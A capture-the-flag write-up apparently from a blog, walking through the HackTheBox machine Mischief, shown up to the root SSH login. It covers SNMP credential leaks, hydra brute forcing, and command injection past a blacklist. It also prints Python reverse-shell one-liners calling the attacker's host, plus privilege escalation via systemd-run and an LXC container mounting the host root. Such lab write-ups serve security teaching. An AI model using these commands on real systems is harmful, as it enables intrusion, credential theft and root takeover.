---
title: HTB: Mischief
url: https://0xdf.gitlab.io/2019/01/05/htb-mischief.html
date: 2019-01-05T13:45:39+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-mischief, ipv6, snmp, snmpwalk, enyx, command-injection, hydra, filter, facl, getfacl, systemd-run, lxc, lxd, wfuzz, xxd, iptables, color-print, htb-olympus
---

![](https://0xdfimages.gitlab.io/img/mischief-cover.png)Mishcief was one of the easier 50 point boxes, but it still provided a lot of opportunity to enumerate things, and forced the attacker to think about and work with IPv6, which is something that likely don’t come naturally to most of us. I’ll use snmp to get both the IPv6 address of the host and credentials from the webserver. From there, I can use those creds to log in and get more creds. The other creds work on a website hosted only on IPv6. That site has command injection, which gives me code execution, a shell as www-data, and creds for loki. loki’s bash history gives me the root password, which I can use to get root, once I get around the fact that file access control lists are used to prevent loki from running su. In beyond root, I’ll look at how I could get RCE without the creds to the website, how I might have exfiled data via ping if there wasn’t a way to see output, the filtering that site did, and the iptables rules.

## Box Info

| Name | [Mischief](https://hackthebox.com/machines/mischief)  [Mischief](https://hackthebox.com/machines/mischief) [Play on HackTheBox](https://hackthebox.com/machines/mischief) |
| --- | --- |
| Release Date | [07 Jul 2018](https://twitter.com/hackthebox_eu/status/1014798459633848320) |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Mischief |
| Radar Graph | Radar chart for Mischief |
| First Blood User | 03:00:35[phra phra](https://app.hackthebox.com/users/19822) |
| First Blood Root | 03:24:45[metantz metantz](https://app.hackthebox.com/users/20347) |
| Creator | [trickster0 trickster0](https://app.hackthebox.com/users/169) |

## Recon

### nmap

`nmap` shows two open TCP ports, SSH on 22 and a `python` webserver on 3366:

```

root@kali# nmap -sT -p- --min-rate 5000 -sV -sC -oA nmap/alltcp 10.10.10.92
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 13:32 EDT
Nmap scan report for 10.10.10.92
Host is up (0.099s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth:
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.94 seconds

```

Based on the ssh version, it’s likely [Ubuntu 18.04](https://packages.ubuntu.com/search?searchon=sourcenames&keywords=openssh).

There’s also SNMP on UDP 161:

```

root@kali# cat nmap/udp_initial.nmap | grep -v "no-response"
# Nmap 7.70 scan initiated Mon Jul  9 14:09:19 2018 as: nmap -vvv -sU -p- --min-rate 5000 -oA nmap/udp_initial 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up, received timestamp-reply ttl 63 (0.096s latency).
Scanned at 2018-07-09 14:09:19 EDT for 27s

PORT      STATE         SERVICE           REASON
161/udp   open          snmp              udp-response ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jul  9 14:09:48 2018 -- 1 IP address (1 host up) scanned in 29.01 seconds

root@kali# nmap -sU -p 161 -sC -oA nmap/udp_snmp_scripts 10.10.10.92
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 14:15 EDT
Nmap scan report for 10.10.10.92
Host is up (0.094s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: b6a9f84e18fef95a00000000
|   snmpEngineBoots: 17
|_  snmpEngineTime: 17h37m51s
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.10.10.92  Netmask: 255.255.255.0
|     MAC address: 00:50:56:8f:dd:d4 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 147.97 Mb sent, 200.50 Mb received
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:3366         0.0.0.0:0
|   TCP  10.10.10.92:3366     10.10.14.3:36898
|   TCP  10.10.10.92:3366     10.10.14.3:36900
...
|   TCP  10.10.10.92:3366     10.10.14.3:41260
|   TCP  10.10.10.92:3366     10.10.14.3:41262
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:37615        *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes:
|   1:
|     Name: systemd
|   2:
|     Name: kthreadd
...[snip]...
|   639:
|     Name: python
...[snip]...
|_  31840:
| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
|_  System uptime: 17h37m51.89s (6347189 timeticks)
|_snmp-win32-software:

Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds

```

### snmp - UDP 161

### Background

Simple Network Management Protocol (snmp) is designed to collect and configure information about devices over the network. The information is organized into a Management Information Base (MIB). Object Identifiers (OID) uniquely identify objects in the MIB. For example, `1.3.6.1.2.1.4.34` is the OID that describes the ipAddressTable. `1.3.6.1.2.1.4.34.1.3` is the ipAddressIfIndex (interface index).

#### Tool Setup

If I run `snmpwalk` as installed on Kali without further setup, it just prints out the OIDs, which aren’t too meaningful. By installing the mibs package, it will turn the numbers into strings that have meaning. First, install the mibs-downloader:

```

root@kali# apt install snmp-mibs-downloader

```

Then go into `/etc/snmp/snmp.conf` and comment out the only uncommented line to use the mibs.

#### snmpwalk Overview

With the mibs installed, I can just dump the entire snmp as follows and then work out of a that file to find the information I need:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 > snmpwalk

```

However, if there is network latency leading to timeouts, or if I just want to be a bit more stealthy, it can be worth looking through various OID to query just those. For example, the process list is kept in the [hrSWRunTable](http://net-snmp.sourceforge.net/docs/mibs/host.html#hrSWRunTable) (OID .1.3.6.1.2.1.25.4.2). I can get the list of running processes by asking for the hrSWRunName:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: "systemd"
HOST-RESOURCES-MIB::hrSWRunName.2 = STRING: "kthreadd"
HOST-RESOURCES-MIB::hrSWRunName.4 = STRING: "kworker/0:0H"
HOST-RESOURCES-MIB::hrSWRunName.6 = STRING: "mm_percpu_wq"
HOST-RESOURCES-MIB::hrSWRunName.7 = STRING: "ksoftirqd/0"
HOST-RESOURCES-MIB::hrSWRunName.8 = STRING: "rcu_sched"
HOST-RESOURCES-MIB::hrSWRunName.9 = STRING: "rcu_bh"
HOST-RESOURCES-MIB::hrSWRunName.10 = STRING: "migration/0"
HOST-RESOURCES-MIB::hrSWRunName.11 = STRING: "watchdog/0"
HOST-RESOURCES-MIB::hrSWRunName.12 = STRING: "cpuhp/0"
...[snip]...

```

#### Find Web Credentials via Process List

One thing I wanted to check out was the python process that’s hosting the webserver on port 3366. I’ll start by finding the ID of that process:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName | grep python
HOST-RESOURCES-MIB::hrSWRunName.617 = STRING: "python"

```

Now, I’ll ask snmp for all of the entries in the hrSWRunTable, and grep for 617:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep 617
HOST-RESOURCES-MIB::hrSWRunIndex.617 = INTEGER: 617
HOST-RESOURCES-MIB::hrSWRunName.617 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.617 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.617 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.617 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
HOST-RESOURCES-MIB::hrSWRunType.617 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.617 = INTEGER: runnable(2)

```

I can see the hrSWRunParameters, which gives me that command line parameters called.

[SimpleHTTPAuthServer](https://github.com/tianhuil/SimpleHTTPAuthServer) seems to take positional arguments of port and key:

```

root@kali# python -m SimpleHTTPAuthServer -h
usage: SimpleHTTPAuthServer [-h] [--dir DIR] [--https] port key

positional arguments:
  port        port number
  key         username:password

optional arguments:
  -h, --help  show this help message and exit
  --dir DIR   directory
  --https     Use https

```

So I now have the creds for that service.

#### Get IPv6 Address - snmpwalk

Any time snmp is exposed, it’s a good way to get the host’s IPv6 address and re-nmap to see if there are any other ports listening on only IPv6. That’s especially worth doing here, as I noticed apache is running in the process list, but I didn’t see it listening with nmap:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName | grep apache
HOST-RESOURCES-MIB::hrSWRunName.778 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.26775 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.26776 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.26777 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.26778 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.26779 = STRING: "apache2"

```

Apache be firewalled off, or only listening on localhost. But it could also just be listening on IPv6.

I’ll grab IP addresses using the [ipAddressAddrType OID](http://cric.grenoble.cnrs.fr/Administrateurs/Outils/MIBS/?oid=1.3.6.1.2.1.4.34.1.1):

```

root@kali# snmpwalk -v 2c -c public 10.10.10.92 ipAddressType
IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv4."10.10.10.255" = INTEGER: broadcast(3)
IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b2:7c:ff" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b2:7c:ff" = INTEGER: unicast(1)

```

#### Get IPv6 address - Enyx

The creator of this box has a tool on [his github](https://github.com/trickster0) designed to do IPv6 enumeration through snmp, [Enyx](https://github.com/trickster0/Enyx). To make this run, mibs must be disabled (uncomment line 4 in `/etc/snmp/snmp.conf`).

```

root@kali# python /opt/Enyx/enyx.py 2c public 10.10.10.92
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################

[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:fe8f:ddd4
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:fe8f:ddd4

```

#### Note About the IPv6 Address

One thing to note about the IPv6 address here - It will change on reset. So if I get the address today and interact with the site, when I come back next week, I’ll likely have to find the address again.

### Web - TCP 3366

Visiting the site pops a basic auth box with prompt “Test”, which I expect at this point having seen the command line:

![1531157814334](https://0xdfimages.gitlab.io/img/1531157814334.png)

Hitting cancel gives an error:

![1531157875454](https://0xdfimages.gitlab.io/img/1531157875454.png)

Giving bad creds just repops to prompt, but on hitting cancel, it shows:

![1531158064775](https://0xdfimages.gitlab.io/img/1531158064775.png)

Where that base64 is the username and password entered :

`root@kali# echo YWRtaW46VGVzdA== | base64 -d admin:Test`

Since I know the creds from snmp, I am able to log in, and get a static page with some additional credentials:

![1531157814334](https://0xdfimages.gitlab.io/img/1531158064776.jpg)

```

loki:godofmischiefisloki
loki:trickeryanddeceit

```

### nmap IPv6

Armed with a new IP address to scan, I’ll nmap again:

```

root@kali# nmap -6 -sT -p- --min-rate 5000 -oA nmap/ipv6-alltcp dead:beef:0000:0000:0250:56ff:fe8f:ddd4
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 14:47 EDT
Warning: dead:beef::250:56ff:fe8f:ddd4 giving up on port because retransmission cap hit (10).
Nmap scan report for dead:beef::250:56ff:fe8f:ddd4
Host is up (0.095s latency).
Not shown: 65498 closed ports, 35 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds

root@kali# nmap -6 -sT -p 22,80 -sV -sC  -oA nmap/ipv6-22_80_scripts  dead:beef:0000:0000:0250:56ff:fe8f:ddd4
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 14:48 EDT
Nmap scan report for dead:beef::250:56ff:fe8f:ddd4
Host is up (0.095s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  http       Apache httpd 2.4.29 ((Ubuntu))

Host script results:
| address-info:
|   IPv6 EUI-64:
|     MAC address:
|       address: 00:50:56:8f:dd:d4
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds

```

There’s the apache server I was looking for.

### Web - IPv6 / TCP 80

#### Site

I’ll use the `[ipv6]` format to visit the IPv6 address using a browser.

The page describes itself as the “Command Execution Panel”, and offers a login:

![1531226092223](https://0xdfimages.gitlab.io/img/1531226092223.png)

The login link goes to `/login.php`, which offers a form:

![1531226115116](https://0xdfimages.gitlab.io/img/1531226115116.png)

Neither of the username / password pairs for loki from the post 3366 site work. Tried some basic sqli injection stuff, nothing obvious.

#### hydra

In [Beyond Root](#getting-rce-without-creds) I’ll show how I could have not worried about the creds and got RCE anyway, but for now, I have some creds from the python site that are worth trying. I did a targeted `hydra` brute force over Seclists top usernames to see if any other obvious usernames might work with them, and got a match:

```

root@kali# cat passwords
godofmischiefisloki
trickeryanddeceit

root@kali# hydra -6 dead:beef::0250:56ff:feb9:5cc4 -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P passwords http-form-post "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-10 08:27:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (l:11/p:2), ~2 tries per task
[DATA] attacking http-post-form://mischief.htb:80//login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match
[80][http-post-form] host: mischief.htb   login: administrator   password: trickeryanddeceit
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-07-10 08:27:10

```

#### Authed Site

The site after login offers a command execution. The default is `ping -c 2 127.0.0.1`. There’s also a hint that there’s a file in the homedir called “credentials”.

![1531226863805](https://0xdfimages.gitlab.io/img/1531226863805.png)

When I run a command, it just tells me that it executed, no output:

![1531226890887](https://0xdfimages.gitlab.io/img/1531226890887.png)

If I change the IP to my IP, I can see the pings:

```

root@kali# tcpdump -i 2 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
08:46:14.049050 IP 10.10.10.92 > kali: ICMP echo request, id 1177, seq 1, length 64
08:46:14.049068 IP kali > 10.10.10.92: ICMP echo reply, id 1177, seq 1, length 64
08:46:15.051081 IP 10.10.10.92 > kali: ICMP echo request, id 1177, seq 2, length 64
08:46:15.051095 IP kali > 10.10.10.92: ICMP echo reply, id 1177, seq 2, length 64

```

#### Enumeration of Filtering

If I try to use nc, it complains:

![1531226978323](https://0xdfimages.gitlab.io/img/1531226978323.png)

The path forward from here is pretty simple, but for the fun of it, I’ll see what other strings are in the blacklist.

I’ll first issue a command with curl to make sure it works:

```

root@kali# curl -s -6 -X POST "http://[dead:beef::250:56ff:feb2:7cff]:80/" -H "Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d" -d "command=nc"

<!DOCTYPE html>
<html>
<title>Command Execution Panel (Beta)</title>
<head>
        <link rel="stylesheet" type="text/css" href="assets/css/style.css">
        <link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
</head>
<body>

        <div class="header">
                <a href="/">Command Execution Panel</a>
        </div>

                <br />Welcome administrator 
                <br /><br />
                <a href="logout.php">Logout?</a>
                <form action="/" method="post">
                Command: <br>
                <input type="text" name="command" value="ping -c 2 127.0.0.1"><br>
                <input type="submit" value="Execute">
                </form>
                <p>
                <p>
                <p>In my home directory, i have my password in a file called credentials, Mr Admin
                <p>

</body>
</html>
Command is not allowed.

```

Neat. Ok. Now I’ll write a bash script that loops over a given word list, and POSTs that word as the command using curl, and checks to see if it’s blocked. I’ll even add some [colored output](https://misc.flogisoft.com/bash/tip_colors_and_formatting) to make it more readable:

```

#/bin/bash

command_file=$1
for cmd in $(cat ${command_file}); do
    curl -s -6 -X POST "http://[dead:beef::250:56ff:feb2:7cff]:80/" -H "Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d" -d "command=${cmd}" | grep -q "Command is not allowed."
    if [ $? -eq 1 ]; then
        echo -e "  \e[42m${cmd}\e[49m allowed";
    else
        echo -e "  \e[41m${cmd}\e[49m blocked";
    fi;
done

```

![1546523176280](https://0xdfimages.gitlab.io/img/1546523176280.png)

In [Beyond Root](#web-application-filtering), I’ll take a look at how the site was filtering.

## Shell as loki

### View RCE Results

Thinking about how the box is taking my input and running it, it is likely running my command and piping the output to `/dev/null` and then checking the status code. But if that’s the case, what happens when I run multiple commands? Output! Before I figured that out, I went down the road of exfiling data over ICMP. I’ll show how I did that in another [Beyond Root Section](#exfil-via-ping).

If I submit `ping -c 2 127.0.0.1; echo test`, I get:

![1546486125357](https://0xdfimages.gitlab.io/img/1546486125357.png)

I wrote a little bash script that will take am ip and cmd, and print out the results:

```

#!/bin/bash

ip=$1
cmd=$2

curl -s -6 -X POST "http://[${ip}]:80/" -d "command=${cmd};" | grep -F "</html>" -A 10 | grep -vF -e "</html>" -e "Command was executed succesfully!"

```

```

root@kali# ./run_command.sh dead:beef::250:56ff:feb2:f978 id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

root@kali# ./run_command.sh dead:beef::250:56ff:feb2:f978 pwd
/var/www/html

```

### Option #1 - Shell as www-data

As I showed in the previous results, the site is running as www-data. I also remember that python is not on the blocked commands filter, so I will use a python reverse shell. I’ll use my bash one-liner from above, and put in the python shell for the command (remembering to esacape the inner “s):

```

root@kali# ./run_command.sh dead:beef::250:56ff:feb2:f978 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.15\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

```

On running this, it just hangs, and I don’t get a callback. The fact that it doesn’t die immediately and return suggests to me that my command ran, but that it was unable to connect back to me (firewall?). What about IPv6?

Start my listener on my IPv6 address:

```

root@kali# nc -nv --listen dead:beef:2::100d 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on dead:beef:2::100d:443

```

Now run the python reverse shell command, changing the socket creation to `socket.AF_INET6` and putting in my IPv6 address:

```

root@kali# ./run_command.sh dead:beef::250:56ff:feb2:f978 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::100d\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

```

And I get a callback:

```

Ncat: Connection from dead:beef::250:56ff:feb2:7cff.
Ncat: Connection from dead:beef::250:56ff:feb2:7cff:48882.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

From this shell, I can’t read user.txt, but I can read the credentials in loki’s home dir:

```

www-data@Mischief:/home/loki$ ls
credentials  hosted  user.txt

www-data@Mischief:/home/loki$ cat user.txt 
cat: user.txt: Permission denied

www-data@Mischief:/home/loki$ cat credentials 
pass: lokiisthebestnorsegod

```

I can use those to `su loki`, and then get user.txt:

```

www-data@Mischief:/home/loki$ su loki
Password: 
loki@Mischief:~$ cat user.txt 
bf58078e...

```

### Option #2 - Get Creds and SSH

I can also just get the creds from the command injection RCE, as long as I can avoid using the term “credentials”, as it is blacklisted. Simple wildcards get around that though:

```

root@kali# ./run_command.sh dead:beef::250:56ff:feb2:f978 "cat /home/loki/credential?"
pass: lokiisthebestnorsegod

```

Armed with that password, I can ssh in as loki:

```

root@kali# ssh loki@10.10.10.92
...[snip]...
loki@Mischief:~$ id
uid=1000(loki) gid=1004(loki) groups=1004(loki)
loki@Mischief:~$ cat user.txt 
bf58078e...

```

## Privesc: loki –> root

### Enumeration

As loki, one of the things that jumped out to me was that the `.bash_history` file wasn’t mapped to `/dev/null`. In looking at it, I notice there’s a similar but different set of credentials being used with the `python SimpleHTTPAuthServer`:

```

loki@Mischief:~$ cat .bash_history 
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit
cat user.txt 
id
exit

```

It turns out that’s root’s password. But, loki can’t `su`:

```

loki@Mischief:~$ su
-bash: /bin/su: Permission denied

```

Why is that? There are a couple things that could be going on. First, does loki have permission to execute? Yes, every user can execute:

```

loki@Mischief:~$ ls -l /bin/su 
-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su

```

Next, I’ll check the pam modules that handle authentication for su. There are a couple ways that loki could be banned from running it, but none seem to be present in `/etc/pam.d/su`:

```

loki@Mischief:~$ cat /etc/pam.d/su
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so

# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu
...[snip]...

```

It turns out that it is an example of extended permissions known as file access control lists (facl). I can access them via the `getfacl` command:

```

loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x

```

As the output shows, loki is specifically not allowed to execute `su`.

### Option #1 - Use www-data Shell

I can go back to my shell as www-data from the RCE, and run su there:

```

www-data@Mischief:/var/www/html$ su
Password: 
root@Mischief:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

```

### Option #2 - systemd-run

I can’t su as loki, but I can use `systemd-run`. This command will not give me an interactive return, but I can launch another reverse shell as root:

```

loki@Mischief:~$ systemd-run python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100d",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: root
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u20.service

```

```

root@kali# nc -6 -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Connection from dead:beef::250:56ff:feb2:7cff.
Ncat: Connection from dead:beef::250:56ff:feb2:7cff:48886.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```

### Option #3 - lxc [PATCHED]

On release, loki was in the group that allowed that user to run `lxc` commands. LXC (Linux Containers) is an operation-system-level virtualization method. But much like [being in the docker group gave me root access in Olympus](/2018/09/22/htb-olympus.html), the same vulnerability exists with `lxc`.

This was patched on 16 July:

![1546490704616](https://0xdfimages.gitlab.io/img/1546490704616.png)

I’ll run an `lxc` image with the system `/` mounted inside the image, and make sure I’m root in the image:

```

loki@Mischief:/dev/shm/.df$ lxc image import alpine-v3.8-x86_64-20180711_0823.tar.gz --alias alpine
Image imported with fingerprint: b20b7859ced4cb00e9229397c089a4d72f87f96364658c9be9ffe739c03cdf38

loki@Mischief:/dev/shm/.df$ lxc image list
+--------+--------------+--------+------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |         DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+------------------------------+--------+--------+-------------------------------+
| alpine | b20b7859ced4 | no     | alpine v3.8 (20180711_08:23) | x86_64 | 2.49MB | Jul 11, 2018 at 12:26pm (UTC) |
+--------+--------------+--------+------------------------------+--------+--------+-------------------------------+

loki@Mischief:/dev/shm/.df$ lxc init alpine priv -c security.privileged=true
Creating priv
Error: No storage pool found. Please create a new storage pool.

loki@Mischief:/dev/shm/.df$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]:
Create a new BTRFS pool? (yes/no) [default=yes]:
Would you like to use an existing block device? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=15GB]: 1
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:

loki@Mischief:/dev/shm/.df$ lxc init alpine priv -c security.privileged=true
Creating priv

loki@Mischief:/dev/shm/.df$ lxc config device add priv host-root disk source=/ path=/mnt/root/
Device host-root added to priv

loki@Mischief:/dev/shm/.df$ lxc start priv
loki@Mischief:/dev/shm/.df$ lxc exec priv /bin/sh
~ # id
uid=0(root) gid=0(root)

/mnt/root/root # ls -l
-r-------- 1 root root 46 May 17  2018 root.txt

```

I’ll get a shell by dropping rsa keys into `/mnt/root/root/.ssh/authorized_keys` (I can create a throw-away pair with `ssh-keygen`):

```

/mnt/root/root/.ssh # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl5LEqq2Z0dsFtwVRAhYfs3VlLEf7bHRLMcMFt9ND+JezGfUSRciY6jx0Z7V8N5G4CQIPy1V1N+6RAHsR003u8Ygu4MVCVhwEOMe5utYa5SWDqFbf1i8LFKlAgPAT5bGu9lm9wx/isQTnB6
2hOhOaN+x/IBKpfuavietZG5F23imeTEcLuVnbRS59RTSkhDky21Cn7OmmJgDPFy473hkkAt4WUJemM6QDkneS8siIgkeMBpiB68Blf17XQ9MNAgawCyEzX2QcUiqJ5tdn3Ekcdfyy3qRuJIpNEfMZ6LdGYjfEZNGYNnIKQmHPfyjqw02deI3Zo2nQ1DeboJEZt+ngD root@kali
'  >> authorized_keys

/mnt/root/root/.ssh # cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl5LEqq2Z0dsFtwVRAhYfs3VlLEf7bHRLMcMFt9ND+JezGfUSRciY6jx0Z7V8N5G4CQIPy1V1N+6RAHsR003u8Ygu4MVCVhwEOMe5utYa5SWDqFbf1i8LFKlAgPAT5bGu9lm9wx/isQTnB62hOhOaN+x/IBKpfuavietZG5F23imeTEcLuVnbRS59RTSkhDky21Cn7OmmJgDPFy473hkkAt4WUJemM6QDkneS8siIgkeMBpiB68Blf17XQ9MNAgawCyEzX2QcUiqJ5tdn3Ekcdfyy3qRuJIpNEfMZ6LdGYjfEZNGYNnIKQmHPfyjqw02deI3Zo2nQ1DeboJEZt+ngD root@kali

```

Now ssh in as root:

```

root@kali# ssh -i ~/id_root-mischief root@10.10.10.92
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 11 20:43:37 UTC 2018

  System load:  0.0                Processes:             154
  Usage of /:   28.5% of 15.68GB   Users logged in:       1
  Memory usage: 54%                IP address for ens33:  10.10.10.92
  Swap usage:   0%                 IP address for lxdbr0: 10.47.91.1
 * Canonical Livepatch is available for installation.
